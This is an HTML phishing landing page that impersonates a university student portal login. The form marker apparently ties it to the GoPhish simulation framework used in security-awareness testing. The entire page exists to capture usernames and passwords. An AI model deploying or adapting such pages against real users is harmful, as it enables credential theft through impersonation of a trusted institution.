<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>University Portal - Login</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <style>
    body { font-family: Arial, sans-serif; background:#f2f2f2; }
    .box { max-width:420px; margin:80px auto; padding:20px; background:#fff; border-radius:6px; box-shadow:0 2px 6px rgba(0,0,0,.1); }
    h2 { margin:0 0 10px; }
    .input { width:100%; padding:10px; margin:8px 0; box-sizing:border-box; }
    .btn { background:#2a6cff; color:#fff; padding:10px 14px; border-radius:4px; text-decoration:none; border:none; cursor:pointer; }
    footer { font-size:12px; color:#777; margin-top:12px; }
  </style>
</head>
<body>
  <div class="box">
    <h2>University Student Portal</h2>
    <p>Please sign in with your university credentials to continue.</p>
    <form method="POST" action="/?__gophish_placeholders__=1">
      <input class="input" type="text" name="username" placeholder="Email or Username" required><br>
      <input class="input" type="password" name="password" placeholder="Password" required><br>
      <button class="btn" type="submit">Sign In</button>
    </form>
    <footer>University IT Services</footer>
  </div>
</body>
</html>
